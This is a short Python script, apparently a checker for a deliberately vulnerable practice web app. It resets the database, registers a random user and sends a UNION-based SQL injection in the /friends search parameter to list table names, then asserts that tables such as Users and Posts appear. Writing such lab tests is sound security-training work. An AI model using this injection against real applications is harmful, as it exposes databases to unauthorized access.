from requests import session, get
from sys import argv
from random import randint

SERVER = argv[1]

s = session()
username = str(randint(2 ** 27, 2 ** 28))
password = str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": username,
    "password": password
}
r = s.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert username in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT TABLE_NAME, 1, 1, 1, 1 FROM INFORMATION_SCHEMA.TABLES -- "
}
r = s.get(SERVER + "/friends", params=params)

assert "Users" in r.text
assert "Friends" in r.text
assert "FriendsRequests" in r.text
assert "Posts" in r.text

print("Success!")
s.close()
